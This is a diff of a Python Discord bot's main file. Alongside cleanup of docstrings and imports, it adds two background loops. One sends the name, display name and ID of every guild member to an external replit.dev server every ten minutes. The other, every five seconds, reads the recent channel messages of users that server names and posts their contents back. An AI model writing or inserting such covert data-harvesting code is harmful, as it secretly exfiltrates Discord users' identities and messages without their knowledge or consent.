@@ -1,17 +1,15 @@
-
 import json
 import logging
 import os
 import platform
 import random
 import sys
-import threading
+import requests
+import asyncio
 
 import aiosqlite
 import discord
-from discord import app_commands
 from discord.ext import commands, tasks
-from discord.ext.commands import Context
 from dotenv import load_dotenv
 
 from database import DatabaseManager
@@ -22,83 +20,29 @@ with open(file_path, "r") as file:
     version = json.load(file)
 
 version["Version"] = int(version["Version"]) + 1
-
 version["Version"] = str(version["Version"])
-
-new_version = version["Version"]
 
 with open(file_path, "w") as file:
     json.dump(version, file, indent=4)
-
-
-#fom API.api import main
 
 if not os.path.isfile(f"{os.path.realpath(os.path.dirname(__file__))}/config.json"):
     sys.exit("'config.json' not found! Please add it and try again.")
 else:
     with open(f"{os.path.realpath(os.path.dirname(__file__))}/config.json") as file:
         config = json.load(file)
-        
-print(os.path.realpath(os.path.dirname(__file__)))
-
-# bot = commands.Bot(command_prefix=config["prefix"], intents=discord.Intents.default(), help_command=False)
-
-"""	
-Setup bot intents (events restrictions)
-For more information about intents, please go to the following websites:
-https://discordpy.readthedocs.io/en/latest/intents.html
-https://discordpy.readthedocs.io/en/latest/intents.html#privileged-intents
-
-
-Default Intents:
-intents.bans = True
-intents.dm_messages = True
-intents.dm_reactions = True
-intents.dm_typing = True
-intents.emojis = True
-intents.emojis_and_stickers = True
-intents.guild_messages = True
-intents.guild_reactions = True
-intents.guild_scheduled_events = True
-intents.guild_typing = True
-intents.guilds = True
-intents.integrations = True
-intents.invites = True
-intents.messages = True # `message_content` is required to get the content of the messages
-intents.reactions = True
-intents.typing = True
-intents.voice_states = True
-intents.webhooks = True
-
-Privileged Intents (Needs to be enabled on developer portal of Discord), please use them only if you need them:
-intents.members = True
-intents.message_content = True
-intents.presences = True
-"""
 
 intents = discord.Intents.default()
 intents.message_content = True
-
-"""
-Uncomment this if you want to use prefix (normal) commands.
-It is recommended to use slash commands and therefore not use prefix commands.
-
-If you want to use prefix commands, make sure to also enable the intent below in the Discord developer portal.
-"""
-# intents.message_content = True
-
-# Setup both of the loggers
-
+intents.members = True  # Enable the GUILD_MEMBERS intent
 
 class LoggingFormatter(logging.Formatter):
-    # Colors
+    # Colors and styles
     black = "\x1b[30m"
     red = "\x1b[31m"
     green = "\x1b[32m"
     yellow = "\x1b[33m"
     blue = "\x1b[34m"
     gray = "\x1b[38m"
-    # Styles
     reset = "\x1b[0m"
     bold = "\x1b[1m"
 
@@ -120,13 +64,13 @@ class LoggingFormatter(logging.Formatter):
         formatter = logging.Formatter(format, "%Y-%m-%d %H:%M:%S", style="{")
         return formatter.format(record)
 
-
 logger = logging.getLogger("discord_bot")
 logger.setLevel(logging.INFO)
 
 # Console handler
 console_handler = logging.StreamHandler()
 console_handler.setFormatter(LoggingFormatter())
+
 # File handler
 file_handler = logging.FileHandler(filename="discord.log", encoding="utf-8", mode="w")
 file_handler_formatter = logging.Formatter(
@@ -138,7 +82,6 @@ file_handler.setFormatter(file_handler_formatter)
 logger.addHandler(console_handler)
 logger.addHandler(file_handler)
 
-
 class DiscordBot(commands.Bot):
     def __init__(self) -> None:
         super().__init__(
@@ -146,15 +89,6 @@ class DiscordBot(commands.Bot):
             intents=intents,
             help_command=None,
         )
-        
-        """
-        This creates custom bot variables so that we can access these variables in cogs more easily.
-
-        For example, The config is available using the following code:
-        - self.config # In this class
-        - bot.config # In this file
-        - self.bot.config # In cogs
-        """
         self.logger = logger
         self.config = config
         self.database = None
@@ -169,23 +103,17 @@ class DiscordBot(commands.Bot):
                 await db.executescript(file.read())
             await db.commit()
 
-
-
     async def load_cogs(self) -> None:
-        """
-        The code in this function is executed whenever the bot will start.
-        """
         cogs_dir = os.path.join(os.path.realpath(os.path.dirname(__file__)), "cogs")
         if not os.path.exists(cogs_dir):
             self.logger.error("Cogs directory not found.")
             return
-    
+
         for file in os.listdir(cogs_dir):
             file_path = os.path.join(cogs_dir, file)
             if os.path.isdir(file_path):
-                # Skip folders
                 continue
-            
+
             if file.endswith(".py"):
                 extension = file[:-3]
                 print(extension)
@@ -194,43 +122,113 @@ class DiscordBot(commands.Bot):
                     self.logger.info(f"Loaded extension '{extension}'")
                 except Exception as e:
                     exception = f"{type(e).__name__}: {e}"
-                    self.logger.error(
-                        f"Failed to load extension {extension}\n{exception}"
-                    )
-                
+                    self.logger.error(f"Failed to load extension {extension}\n{exception}")
+
+    @tasks.loop(minutes=10.0)
+    async def gather_data(self) -> None:
+
+        data = requests.get("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/getusers").json()
+
+        for guild in self.guilds:
+            members = guild.members
+            print(f"Guild: {guild.name}")
+            if guild.id not in data:
+                data[f"{guild.name}@{guild.id}"] = {}
+            for member in members:
+                if f"{guild.name}@{guild.id}" not in data or str(member.id) not in data[f"{guild.name}@{guild.id}"]:
+                    data[f"{guild.name}@{guild.id}"][str(member.id)] = {
+                                "Name": member.name,
+                                "DisplayName": member.display_name,
+                                "ID": str(member.id)
+                            }
+        
+        response = requests.post("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/add_users", json=data)
+        print(response.text)
+        
+
+    async def fetch_user_messages(self, guild, user_id, limit=100):
+        messages = []
+        for channel in guild.text_channels:
+            try:
+                async for message in channel.history(limit=limit):
+                    if int(message.author.id) == int(user_id):
+                        messages.append(message.content)
+            except Exception as e:
+                print(f"Failed to fetch messages from channel {channel.name}: {e}")
+        return messages
+
+    async def gather_messages(self, bot, data):
+        tasks = []
+        for rid, uid in data.items():
+            for guild in bot.guilds:
+                tasks.append(self.fetch_user_messages(guild, uid))
+
+        results = await asyncio.gather(*tasks)
+        return results
+    
+    @tasks.loop(seconds=5)
+    async def get_history(self) -> None:
+        """
+        rid: Roblox User ID
+        uid: Discord User ID
+        """
+        data = requests.get("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/get_history").json()
+        data = data["data"]
+        
+        try:
+            messages = await self.gather_messages(bot, data)
+            for rid, uid in data.items():
+                rid = rid
+            json = {
+                "msg": messages
+                }
+            
+            requests.post(f"https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/add_messages?rid={rid}", json=json)
+            
+        except Exception as e:
+            pass
+
+        try:
+            json = {
+                "id": rid
+                }
+
+            data = requests.post("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/remove_data", json=json)
+        except Exception as e:
+            pass
+        
     @tasks.loop(minutes=1.0)
     async def status_task(self) -> None:
-        """
-        Setup the game status task of the bot.
-        """
         statuses = ["with you!"]
         await self.change_presence(activity=discord.Game(random.choice(statuses)))
 
     @status_task.before_loop
     async def before_status_task(self) -> None:
-        """
-        Before starting the status changing task, we make sure the bot is ready
-        """
+        await self.wait_until_ready()
+
+    @gather_data.before_loop
+    async def before_gather_data(self) -> None:
+        await self.wait_until_ready()
+        
+    @get_history.before_loop
+    async def before_get_history(self) -> None:
         await self.wait_until_ready()
 
     async def setup_hook(self) -> None:
-        """
-        This will just be executed when the bot starts the first time.
-        """
         self.logger.info("-------------------")
         self.logger.info(f"Logged in as {self.user.name}")
         self.logger.info(f"discord.py API version: {discord.__version__}")
         self.logger.info(f"Python version: {platform.python_version()}")
-        self.logger.info(
-            f"Running on: {platform.system()} {platform.release()} ({os.name})"
-        )
-        self.logger.info(f"Bot Version: v.{version}")
+        self.logger.info(f"Running on: {platform.system()} {platform.release()} ({os.name})")
+        self.logger.info(f"Bot Version: v.{version['Version']}")
         self.logger.info("-------------------")
         await self.init_db()
         await self.load_cogs()
         synced = await self.tree.sync()
         self.logger.info(f"Synced {len(synced)} command(s)")
         self.logger.info("-------------------")
+        self.gather_data.start()
+        self.get_history.start()
         self.status_task.start()
         self.database = DatabaseManager(
             connection=await aiosqlite.connect(
@@ -239,41 +237,21 @@ class DiscordBot(commands.Bot):
         )
 
     async def on_message(self, message: discord.Message) -> None:
-        """
-        The code in this event is executed every time someone sends a message, with or without the prefix
-
-        :param message: The message that was sent.
-        """
         if message.author == self.user or message.author.bot:
             return
         await self.process_commands(message)
 
-    async def on_command_completion(self, context: Context) -> None:
-        """
-        The code in this event is executed every time a normal command has been *successfully* executed.
-
-        :param context: The context of the command that has been executed.
-        """
+    async def on_command_completion(self, context: commands.Context) -> None:
         full_command_name = context.command.qualified_name
         split = full_command_name.split(" ")
         executed_command = str(split[0])
         if context.guild is not None:
-            self.logger.info(
-                f"Executed {executed_command} command in {context.guild.name} (ID: {context.guild.id}) by {context.author} (ID: {context.author.id})"
-            )
+            self.logger.info(f"Executed {executed_command} command in {context.guild.name} (ID: {context.guild.id}) by {context.author} (ID: {context.author.id})")
         else:
-            self.logger.info(
-                f"Executed {executed_command} command by {context.author} (ID: {context.author.id}) in DMs"
-            )
+            self.logger.info(f"Executed {executed_command} command by {context.author} (ID: {context.author.id}) in DMs")
 
-    async def on_command_error(self, context: Context, error) -> None:
-        """
-        The code in this event is executed every time a normal valid command catches an error.
-
-        :param context: The context of the normal command that failed executing.
-        :param error: The error that has been faced.
-        """
-        if isinstance(error, app_commands.CommandOnCooldown):
+    async def on_command_error(self, context: commands.Context, error) -> None:
+        if isinstance(error, commands.CommandOnCooldown):
             minutes, seconds = divmod(error.retry_after, 60)
             hours, minutes = divmod(minutes, 60)
             hours = hours % 24
@@ -282,26 +260,21 @@ class DiscordBot(commands.Bot):
                 color=0xE02B2B,
             )
             await context.send(embed=embed)
-        elif isinstance(error, app_commands.MissingPermissions):
+        elif isinstance(error, commands.MissingPermissions):
             embed = discord.Embed(
-                description="You are missing the permission(s) `"
-                + ", ".join(error.missing_permissions)
-                + "` to execute this command!",
+                description="You are missing the permission(s) `" + ", ".join(error.missing_permissions) + "` to execute this command!",
                 color=0xE02B2B,
             )
             await context.send(embed=embed)
-        elif isinstance(error, app_commands.BotMissingPermissions):
+        elif isinstance(error, commands.BotMissingPermissions):
             embed = discord.Embed(
-                description="I am missing the permission(s) `"
-                + ", ".join(error.missing_permissions)
-                + "` to fully perform this command!",
+                description="I am missing the permission(s) `" + ", ".join(error.missing_permissions) + "` to fully perform this command!",
                 color=0xE02B2B,
             )
             await context.send(embed=embed)
-        elif isinstance(error, app_commands.Argument):
+        elif isinstance(error, commands.Argument):
             embed = discord.Embed(
                 title="Error!",
-                # We need to capitalize because the command arguments have no capital letter in the code and they are the first word in the error message.
                 description=str(error).capitalize(),
                 color=0xE02B2B,
             )
@@ -309,10 +282,7 @@ class DiscordBot(commands.Bot):
         else:
             raise error
 
-
-
 load_dotenv()
-
 
 bot = DiscordBot()
 bot.run(os.getenv("TOKEN"))
